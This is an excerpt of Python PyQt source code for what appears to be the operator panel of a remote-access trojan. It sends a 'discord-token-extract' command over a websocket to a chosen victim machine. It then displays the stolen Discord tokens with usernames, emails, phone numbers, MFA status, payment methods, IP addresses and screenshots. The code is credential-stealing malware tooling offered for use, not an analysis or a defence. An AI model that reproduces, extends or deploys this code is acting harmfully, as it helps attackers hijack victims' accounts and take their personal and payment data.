...
class ViewerWindow(QMainWindow):
        ...
        try:
            ...
            async for message in self.ws:
                ...
                try:
                    ...
                    if msg_type == 'discord-tokens':
                        print(f"[DEBUG] Found discord-tokens message: {data}")
                ...
                if msg_type == 'command-output':
                    ...
                    # Route discord-tokens results to Discord handler
                    if req == 'discord-tokens':
                        print(f"[DEBUG] Received discord-tokens message: {data}")
                        # The server wraps the actual data in data.data
                        discord_data = data.get('data', data)  # Use nested data or fallback to outer data
                        print(f"[DEBUG] Discord data extracted: {discord_data}")
                        QTimer.singleShot(0, lambda d=discord_data: self.handle_discord_tokens(d))
                        continue
    ...
    def setup_ui(self):
        ...
        discord_group = QGroupBox('🎭  Discord Tokens')
        discord_layout = QVBoxLayout()
        discord_layout.setSpacing(6)
        
        discord_info = QLabel('Extract and view Discord tokens from remote machines')
        discord_info.setStyleSheet('color: #9ca3af; font-size: 10px;')
        discord_layout.addWidget(discord_info)
        
        # Discord control buttons
        discord_buttons = QHBoxLayout()
        discord_buttons.setSpacing(6)
        
        self.discord_extract_btn = QPushButton('🎭 Extract Tokens')
        self.discord_extract_btn.setToolTip('Extract Discord tokens from selected machine')
        self.discord_extract_btn.setStyleSheet('''
            QPushButton {
                background: #7c3aed;
                color: white;
                font-weight: bold;
        ...
        self.discord_clear_btn = QPushButton('🗑️ Clear Results')
        self.discord_clear_btn.setToolTip('Clear Discord token results')
        self.discord_clear_btn.setStyleSheet('''
            QPushButton {
                background: #dc2626;
                color: white;
                font-weight: bold;
        ...
        discord_buttons.addWidget(self.discord_extract_btn)
        discord_buttons.addWidget(self.discord_clear_btn)
        discord_buttons.addStretch()
        discord_layout.addLayout(discord_buttons)
        
        # Progress and status
        self.discord_progress = QProgressBar()
        self.discord_progress.setVisible(False)
        self.discord_progress.setStyleSheet('''
            QProgressBar {
                border: 1px solid #3a3c4e;
                border-radius: 4px;
                text-align: center;
        ...
        ''')
        discord_layout.addWidget(self.discord_progress)
        
        self.discord_status_label = QLabel('Ready for Discord token extraction...')
        self.discord_status_label.setStyleSheet('color: #9ca3af; font-size: 10px;')
        discord_layout.addWidget(self.discord_status_label)
        
        # Results area
        discord_results_label = QLabel('Token Results:')
        discord_results_label.setStyleSheet('color: #e5e7eb; font-weight: bold; font-size: 10px;')
        discord_layout.addWidget(discord_results_label)
        
        self.discord_results = QTextEdit()
        self.discord_results.setMaximumHeight(200)
        self.discord_results.setReadOnly(True)
        self.discord_results.setStyleSheet('''
            QTextEdit {
                background: #1a1b24;
                color: #e5e7eb;
                border: 1px solid #3a3c4e;
        ...
        ''')
        discord_layout.addWidget(self.discord_results)
        
        discord_group.setLayout(discord_layout)
        tools_layout.addWidget(discord_group)
        
        # Connect Discord buttons
        self.discord_extract_btn.clicked.connect(self.extract_discord_tokens)
        self.discord_clear_btn.clicked.connect(self.clear_discord_results)
    ...
    def extract_discord_tokens(self):
        """Extract Discord tokens from remote machine"""
        # Get the actual machine ID from itemData, not the display text
        current_index = self.sender_list.currentIndex()
        target_machine = self.sender_list.itemData(current_index) if current_index >= 0 else None
        
        print(f"[DEBUG] Discord extraction called, target_machine (from itemData): {target_machine}")
        print(f"[DEBUG] Selected display text: {self.sender_list.currentText()}")
        
        if not target_machine:
            print("[DEBUG] No target machine selected, showing warning")
            QMessageBox.warning(self, "No Target", "Please select a target machine first.")
            return
        
        # Clear previous results
        self.discord_results.clear()
        self.discord_progress.setVisible(True)
        self.discord_progress.setValue(0)
        self.discord_status_label.setText("Starting Discord token extraction...")
        self.discord_extract_btn.setEnabled(False)
        
        # Send extraction command to remote machine
        payload = {
            'type': 'remote-command',
            'action': 'discord-token-extract',
            'machineId': target_machine
        }
        print(f"[DEBUG] Sending Discord extraction payload: {payload}")
        
        asyncio.ensure_future(self.send_ws(payload))
        
        self.discord_status_label.setText(f"Token extraction started on {target_machine}...")
        print(f"[DEBUG] Discord extraction command sent to {target_machine}")
    
    def clear_discord_results(self):
        """Clear Discord token results"""
        self.discord_results.clear()
        self.discord_status_label.setText("Results cleared. Ready for Discord token extraction...")
    
    def handle_discord_tokens(self, data):
        """Handle Discord token results from remote machine"""
        print(f"[DEBUG] Discord token results received: {data}")
        computer_name = data.get('computerName', 'Unknown')
        tokens = data.get('tokens', [])
        timestamp = data.get('timestamp', '')
        screenshot = data.get('screenshot', '')
        
        self.discord_results.append(f"🎭 Discord Token Results from {computer_name}")
        self.discord_results.append(f"📅 Timestamp: {timestamp}")
        self.discord_results.append("=" * 60)
        
        if not tokens:
            self.discord_results.append("❌ No Discord tokens found")
            print("[DEBUG] No tokens found in results")
        else:
            self.discord_results.append(f"✅ Found {len(tokens)} valid Discord token(s):")
            self.discord_results.append("")
            print(f"[DEBUG] Found {len(tokens)} Discord tokens")
            
            for i, token in enumerate(tokens, 1):
                self.discord_results.append(f"🎭 Token #{i}:")
                self.discord_results.append(f"👤 Username: {token.get('username', 'Unknown')}")
                self.discord_results.append(f"🆔 User ID: {token.get('userId', 'Unknown')}")
                self.discord_results.append(f"📧 Email: {token.get('email', 'N/A')}")
                self.discord_results.append(f"📱 Phone: {token.get('phone', 'N/A')}")
                self.discord_results.append(f"🔐 MFA: {'Enabled' if token.get('mfaEnabled', False) else 'Disabled'}")
                self.discord_results.append(f"💎 Nitro: {token.get('nitroStatus', 'None')}")
                
                badges = token.get('badges', [])
                if badges:
                    self.discord_results.append(f"🏆 Badges: {', '.join(badges)}")
                
                payment_methods = token.get('paymentMethods', [])
                if payment_methods:
                    self.discord_results.append(f"💳 Payment Methods: {', '.join(payment_methods)}")
                
                self.discord_results.append(f"🌐 IP: {token.get('ipAddress', 'Unknown')}")
                self.discord_results.append(f"🖥️ Platform: {token.get('platform', 'Unknown')}")
                self.discord_results.append(f"🔑 Token: {token.get('token', 'Unknown')}")
                self.discord_results.append("-" * 40)
        
        # Handle screenshot if available
        if screenshot:
            print("[DEBUG] Screenshot data included in results")
            try:
                import base64
                ...
                if not pixmap.isNull():
                    self.discord_results.append("📸 Screenshot captured successfully")
                else:
                    self.discord_results.append("❌ Failed to load screenshot")
            except Exception as e:
                self.discord_results.append(f"❌ Error processing screenshot: {str(e)}")
        
        self.discord_results.append("")
        self.discord_progress.setValue(100)
        self.discord_status_label.setText("Token extraction complete")
        self.discord_extract_btn.setEnabled(True)
        print("[DEBUG] Discord token results processed and displayed")
